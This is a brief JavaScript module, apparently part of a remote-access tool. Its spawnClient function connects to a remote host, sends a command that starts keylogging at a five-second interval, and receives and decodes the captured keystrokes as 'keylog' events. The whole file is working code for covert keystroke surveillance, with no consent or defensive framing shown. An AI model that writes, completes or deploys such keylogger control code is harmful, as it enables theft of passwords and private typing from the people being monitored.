const Client = require('../../../../src/Client')
const { Packets } = require('../../../../src/lib/Protocol')

function spawnClient (host, port) {
  console.log('Connecting to', host, port)
  var client = new Client()

  client.connect(
    port,
    host,
    null,
    function () {
      this.emit('connect')

      this._TCPclient.write(Packets.KeylogSetup.create({ interval: 5000 }))

      this.on(Packets.r_Keylog, function (packet) {
        this.emit(
          'keylog',
          String.fromCharCode(...packet.data).replace(/[^\x1F-\x7F\n]/g, '')
        )
      })
    }
  )

  return client
}

export { spawnClient }
